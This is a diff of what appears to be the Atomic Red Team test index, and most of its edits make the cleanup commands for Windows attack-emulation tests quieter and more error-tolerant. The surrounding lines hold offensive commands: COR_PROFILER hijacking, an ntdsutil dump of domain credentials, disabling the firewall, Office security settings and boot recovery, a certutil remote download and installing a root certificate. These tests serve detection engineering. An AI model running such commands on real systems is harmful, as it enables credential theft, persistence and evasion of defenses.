@@ -550,7 +550,7 @@ privilege-escalation:
         command: 'reg.exe import #{registry_file}
 
 '
-        cleanup_command: 'reg.exe import #{registry_cleanup_file}
+        cleanup_command: 'reg.exe import #{registry_cleanup_file} >nul 2>&1
 
 '
         name: command_prompt
@@ -666,7 +666,7 @@ privilege-escalation:
         command: 'sdbinst.exe #{file_path}
 
 '
-        cleanup_command: 'sdbinst.exe -u #{file_path}
+        cleanup_command: 'sdbinst.exe -u #{file_path} >nul 2>&1
 
 '
         name: command_prompt
@@ -1483,7 +1483,7 @@ privilege-escalation:
         command: 'assoc #{extension_to_change}=#{target_extension_handler}
 
 '
-        cleanup_command: 'assoc .hta=htafile
+        cleanup_command: 'assoc .hta=htafile >nul 2>&1
 
 '
         name: command_prompt
@@ -1659,12 +1659,12 @@ privilege-escalation:
           New-ItemProperty -Path HKCU:\Environment -Name "COR_PROFILER_PATH" -PropertyType String -Value #{file_name} -Force | Out-Null
           Write-Host "executing eventvwr.msc" -ForegroundColor Cyan
           START MMC.EXE EVENTVWR.MSC
-        cleanup_command: |
-          Write-Host "Removing registry keys" -ForegroundColor Cyan
-          Remove-Item -Path "HKCU:\Software\Classes\CLSID\#{clsid_guid}" -Recurse -Force
-          Remove-ItemProperty -Path HKCU:\Environment -Name "COR_ENABLE_PROFILING" -Force | Out-Null
-          Remove-ItemProperty -Path HKCU:\Environment -Name "COR_PROFILER" -Force | Out-Null
-          Remove-ItemProperty -Path HKCU:\Environment -Name "COR_PROFILER_PATH" -Force | Out-Null
+        cleanup_command: "Remove-Item -Path \"HKCU:\\Software\\Classes\\CLSID\\#{clsid_guid}\"
+          -Recurse -Force -ErrorAction Ignore \nRemove-ItemProperty -Path HKCU:\\Environment
+          -Name \"COR_ENABLE_PROFILING\" -Force -ErrorAction Ignore | Out-Null\nRemove-ItemProperty
+          -Path HKCU:\\Environment -Name \"COR_PROFILER\" -Force -ErrorAction Ignore
+          | Out-Null\nRemove-ItemProperty -Path HKCU:\\Environment -Name \"COR_PROFILER_PATH\"
+          -Force -ErrorAction Ignore | Out-Null\n"
         name: powershell
     - name: COM Hijack Leveraging System Scope COR_PROFILER
       auto_generated_guid: f373b482-48c8-4ce4-85ed-d40c8b3f7310
@@ -1698,10 +1698,9 @@ privilege-escalation:
           New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name "COR_PROFILER" -PropertyType String -Value "#{clsid_guid}" -Force | Out-Null
           New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name "COR_PROFILER_PATH" -PropertyType String -Value #{file_name} -Force | Out-Null
         cleanup_command: |
-          Write-Host "Removing system environment variables" -ForegroundColor Cyan
-          Remove-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name "COR_ENABLE_PROFILING" -Force | Out-Null
-          Remove-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name "COR_PROFILER" -Force | Out-Null
-          Remove-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name "COR_PROFILER_PATH" -Force | Out-Null
+          Remove-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name "COR_ENABLE_PROFILING" -Force -ErrorAction Ignore | Out-Null
+          Remove-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name "COR_PROFILER" -Force -ErrorAction Ignore | Out-Null
+          Remove-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name "COR_PROFILER_PATH" -Force -ErrorAction Ignore | Out-Null
         name: powershell
         elevation_required: true
     - name: COM Hijack Leveraging registry-free process scope COR_PROFILER
@@ -8539,7 +8538,7 @@ persistence:
         command: 'reg.exe import #{registry_file}
 
 '
-        cleanup_command: 'reg.exe import #{registry_cleanup_file}
+        cleanup_command: 'reg.exe import #{registry_cleanup_file} >nul 2>&1
 
 '
         name: command_prompt
@@ -8655,7 +8654,7 @@ persistence:
         command: 'sdbinst.exe #{file_path}
 
 '
-        cleanup_command: 'sdbinst.exe -u #{file_path}
+        cleanup_command: 'sdbinst.exe -u #{file_path} >nul 2>&1
 
 '
         name: command_prompt
@@ -9486,7 +9485,7 @@ persistence:
         command: 'assoc #{extension_to_change}=#{target_extension_handler}
 
 '
-        cleanup_command: 'assoc .hta=htafile
+        cleanup_command: 'assoc .hta=htafile >nul 2>&1
 
 '
         name: command_prompt
@@ -9781,12 +9780,12 @@ persistence:
           New-ItemProperty -Path HKCU:\Environment -Name "COR_PROFILER_PATH" -PropertyType String -Value #{file_name} -Force | Out-Null
           Write-Host "executing eventvwr.msc" -ForegroundColor Cyan
           START MMC.EXE EVENTVWR.MSC
-        cleanup_command: |
-          Write-Host "Removing registry keys" -ForegroundColor Cyan
-          Remove-Item -Path "HKCU:\Software\Classes\CLSID\#{clsid_guid}" -Recurse -Force
-          Remove-ItemProperty -Path HKCU:\Environment -Name "COR_ENABLE_PROFILING" -Force | Out-Null
-          Remove-ItemProperty -Path HKCU:\Environment -Name "COR_PROFILER" -Force | Out-Null
-          Remove-ItemProperty -Path HKCU:\Environment -Name "COR_PROFILER_PATH" -Force | Out-Null
+        cleanup_command: "Remove-Item -Path \"HKCU:\\Software\\Classes\\CLSID\\#{clsid_guid}\"
+          -Recurse -Force -ErrorAction Ignore \nRemove-ItemProperty -Path HKCU:\\Environment
+          -Name \"COR_ENABLE_PROFILING\" -Force -ErrorAction Ignore | Out-Null\nRemove-ItemProperty
+          -Path HKCU:\\Environment -Name \"COR_PROFILER\" -Force -ErrorAction Ignore
+          | Out-Null\nRemove-ItemProperty -Path HKCU:\\Environment -Name \"COR_PROFILER_PATH\"
+          -Force -ErrorAction Ignore | Out-Null\n"
         name: powershell
     - name: COM Hijack Leveraging System Scope COR_PROFILER
       auto_generated_guid: f373b482-48c8-4ce4-85ed-d40c8b3f7310
@@ -9820,10 +9819,9 @@ persistence:
           New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name "COR_PROFILER" -PropertyType String -Value "#{clsid_guid}" -Force | Out-Null
           New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name "COR_PROFILER_PATH" -PropertyType String -Value #{file_name} -Force | Out-Null
         cleanup_command: |
-          Write-Host "Removing system environment variables" -ForegroundColor Cyan
-          Remove-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name "COR_ENABLE_PROFILING" -Force | Out-Null
-          Remove-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name "COR_PROFILER" -Force | Out-Null
-          Remove-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name "COR_PROFILER_PATH" -Force | Out-Null
+          Remove-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name "COR_ENABLE_PROFILING" -Force -ErrorAction Ignore | Out-Null
+          Remove-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name "COR_PROFILER" -Force -ErrorAction Ignore | Out-Null
+          Remove-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name "COR_PROFILER_PATH" -Force -ErrorAction Ignore | Out-Null
         name: powershell
         elevation_required: true
     - name: COM Hijack Leveraging registry-free process scope COR_PROFILER
@@ -15147,9 +15145,11 @@ persistence:
           Enable-TransportAgent #{transport_agent_identity}
           Get-TransportAgent | Format-List Name,Enabled
         cleanup_command: |
-          Disable-TransportAgent #{transport_agent_identity}
-          Uninstall-TransportAgent #{transport_agent_identity}
-          Get-TransportAgent
+          if(Get-Command "Get-TransportAgent" -ErrorAction Ignore){
+            Disable-TransportAgent #{transport_agent_identity}
+            Uninstall-TransportAgent #{transport_agent_identity}
+            Get-TransportAgent
+          }
         name: powershell
         elevation_required: true
   T1546.005:
@@ -18304,7 +18304,7 @@ credential-access:
         command: |
           mkdir #{output_folder}
           ntdsutil "ac i ntds" "ifm" "create full #{output_folder}" q q
-        cleanup_command: 'rmdir /q /s #{output_folder}
+        cleanup_command: 'rmdir /q /s #{output_folder} >nul 2>&1
 
 '
         name: command_prompt
@@ -22217,10 +22217,10 @@ defense-evasion:
           /section:httplogging /dontLog:true
 
 '
-        cleanup_command: 'C:\Windows\System32\inetsrv\appcmd.exe set config "#{website_name}"
-          /section:httplogging /dontLog:false
-
-'
+        cleanup_command: |
+          if(Test-Path "C:\Windows\System32\inetsrv\appcmd.exe"){
+            C:\Windows\System32\inetsrv\appcmd.exe set config "#{website_name}" /section:httplogging /dontLog:false *>$null
+          }
         name: powershell
   T1562.004:
     technique:
@@ -22293,7 +22293,7 @@ defense-evasion:
         command: 'netsh advfirewall set currentprofile state off
 
 '
-        cleanup_command: 'netsh advfirewall set currentprofile state on
+        cleanup_command: 'netsh advfirewall set currentprofile state on >nul 2>&1
 
 '
         name: command_prompt
@@ -22308,7 +22308,7 @@ defense-evasion:
         command: |
           netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
           netsh advfirewall firewall set rule group="file and printer sharing" new enable=Yes
-        cleanup_command: 'netsh advfirewall reset
+        cleanup_command: 'netsh advfirewall reset >nul 2>&1
 
 '
         name: command_prompt
@@ -22324,7 +22324,7 @@ defense-evasion:
         command: "netsh advfirewall firewall add rule name=\"atomic testing\" action=allow
           dir=in protocol=TCP localport=450 \n"
         cleanup_command: netsh advfirewall firewall delete rule name="atomic testing"
-          protocol=TCP localport=450
+          protocol=TCP localport=450 >nul 2>&1
         name: command_prompt
         elevation_required: true
   T1562.001:
@@ -22692,7 +22692,7 @@ defense-evasion:
 '
         name: powershell
         elevation_required: true
-    - name: Disable Microft Office Security Features
+    - name: Disable Microsoft Office Security Features
       auto_generated_guid: 6f5fb61b-4e56-4a3d-a8c3-82e13686c6d7
       description: |
         Gorgon group may disable Office security features so that their code can run. Upon execution, an external document will not
@@ -22712,8 +22712,8 @@ defense-evasion:
           New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\16.0\Excel\Security\ProtectedView" -Name "DisableUnsafeLocationsInPV" -Value "1" -PropertyType "Dword"
           New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\16.0\Excel\Security\ProtectedView" -Name "DisableAttachementsInPV" -Value "1" -PropertyType "Dword"
         cleanup_command: |
-          Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Office\16.0\Excel\Security" -Name "VBAWarnings"
-          Remove-Item -Path "HKCU:\Software\Microsoft\Office\16.0\Excel\Security\ProtectedView"
+          Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Office\16.0\Excel\Security" -Name "VBAWarnings" -ErrorAction Ignore | Out-Null
+          Remove-Item -Path "HKCU:\Software\Microsoft\Office\16.0\Excel\Security\ProtectedView" -ErrorAction Ignore
         name: powershell
     - name: Remove Windows Defender Definition Files
       auto_generated_guid: 3d47daaa-2f56-43e0-94cc-caf5d8d52a68
@@ -24975,7 +24975,7 @@ defense-evasion:
         prereq_command: 'if (Test-Path #{pfx_path}) { exit 0 } else { exit 1 }'
         get_prereq_command: |-
           $cert = New-SelfSignedCertificate -DnsName atomicredteam.com -CertStoreLocation cert:\LocalMachine\My
-          Export-Certificate -Type CERT -Cert  Cert:\LocalMachine\My\$cert.Thumbprint -FilePath #{pfx_path}
+          Export-Certificate -Type CERT -Cert  Cert:\LocalMachine\My\$($cert.Thumbprint) -FilePath #{pfx_path}
           Get-ChildItem Cert:\LocalMachine\My\$($cert.Thumbprint) | Remove-Item
       executor:
         command: |
@@ -24983,9 +24983,9 @@ defense-evasion:
           Move-Item -Path $cert.PSPath -Destination "Cert:\LocalMachine\Root"
         cleanup_command: |
           $cert = Import-Certificate -FilePath #{pfx_path} -CertStoreLocation Cert:\LocalMachine\My
-          Get-ChildItem Cert:\LocalMachine\My\$($cert.Thumbprint) | Remove-Item
-          Get-ChildItem Cert:\LocalMachine\Root\$($cert.Thumbprint) | Remove-Item
-        name: command_prompt
+          Get-ChildItem Cert:\LocalMachine\My\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore
+          Get-ChildItem Cert:\LocalMachine\Root\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore
+        name: powershell
         elevation_required: true
   T1218.004:
     technique:
@@ -31985,9 +31985,7 @@ defense-evasion:
           import-module #{file_path}\timestomp.ps1
           timestomp -dest "#{file_path}\kxwn.lock"
         cleanup_command: |-
-          Write-Host "Removing #{file_path}\timestomp.ps1"
           Remove-Item #{file_path}\timestomp.ps1 -ErrorAction Ignore
-          Write-Host "Removing #{file_path}\kxwn.lock"
           Remove-Item #{file_path}\kxwn.lock -ErrorAction Ignore
         name: powershell
   T1134.001:
@@ -34049,8 +34047,8 @@ impact:
           bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures
           bcdedit.exe /set {default} recoveryenabled no
         cleanup_command: |
-          bcdedit.exe /set {default} bootstatuspolicy DisplayAllFailures
-          bcdedit.exe /set {default} recoveryenabled yes
+          bcdedit.exe /set {default} bootstatuspolicy DisplayAllFailures >nul 2>&1
+          bcdedit.exe /set {default} recoveryenabled yes >nul 2>&1
         name: command_prompt
         elevation_required: true
     - name: Windows - Delete Volume Shadow Copies via WMI with PowerShell
@@ -44074,7 +44072,7 @@ command-and-control:
         command: 'cmd /c certutil -urlcache -split -f #{remote_file} #{local_path}
 
 '
-        cleanup_command: 'del #{local_path}
+        cleanup_command: 'del #{local_path} >nul 2>&1
 
 '
         name: command_prompt
@@ -44331,6 +44329,7 @@ command-and-control:
         command: netsh interface portproxy add v4tov4 listenport=#{listenport} connectport=#{connectport}
           connectaddress=#{connectaddress}
         cleanup_command: netsh interface portproxy delete v4tov4 listenport=#{listenport}
+          -ErrorAction Ignore | Out-Null
         name: powershell
         elevation_required: true
   T1001.001:
@@ -45185,9 +45184,10 @@ command-and-control:
           Start-Process $file1 /S;
           Start-Process 'C:\Program Files (x86)\TeamViewer\TeamViewer.exe'
         cleanup_command: |-
-          Start-Process 'C:\Program Files (x86)\TeamViewer\uninstall.exe' "/S"
+          $file = 'C:\Program Files (x86)\TeamViewer\uninstall.exe'
+          if(Test-Path $file){ Start-Process $file "/S" -ErrorAction Ignore | Out-Null }
           $file1 = "C:\Users\" + $env:username + "\Desktop\TeamViewer_Setup.exe"
-          Remove-Item $file1
+          Remove-Item $file1 -ErrorAction Ignore | Out-Null
         name: powershell
         elevation_required: true
     - name: AnyDesk Files Detected Test on Windows
@@ -45206,7 +45206,7 @@ command-and-control:
           Start-Process $file1 /S;
         cleanup_command: |-
           $file1 = "C:\Users\" + $env:username + "\Desktop\AnyDesk.exe.exe"
-          Remove-Item $file1
+          Remove-Item $file1 -ErrorAction Ignore
         name: powershell
         elevation_required: true
     - name: LogMeIn Files Detected Test on Windows
@@ -45224,10 +45224,9 @@ command-and-control:
           $file1 = "C:\Users\" + $env:username + "\Desktop\LogMeInIgnition.msi"
           Start-Process $file1 /S;
           Start-Process 'C:\Program Files (x86)\LogMeInIgnition\LMIIgnition.exe' "/S"
-        cleanup_command: |-
-          get-package *'LogMeIn Client'* | uninstall-package
-          $file1 = "C:\Users\" + $env:username + "\Desktop\LogMeInIgnition.msi"
-          Remove-Item $file1
+        cleanup_command: "get-package *'LogMeIn Client'* -ErrorAction Ignore | uninstall-package
+          \n$file1 = \"C:\\Users\\\" + $env:username + \"\\Desktop\\LogMeInIgnition.msi\"\nRemove-Item
+          $file1 -ErrorAction Ignore"
         name: powershell
         elevation_required: true
   T1132.001:
@@ -46196,7 +46195,7 @@ collection:
           New-Item -Path $env:TEMP\T1119_powershell_collection -ItemType Directory -Force | Out-Null
           Get-ChildItem -Recurse -Include *.doc | % {Copy-Item $_.FullName -destination $env:TEMP\T1119_powershell_collection}
         cleanup_command: 'Remove-Item $env:TEMP\T1119_powershell_collection -Force
-          | Out-Null
+          -ErrorAction Ignore | Out-Null
 
 '
         name: powershell
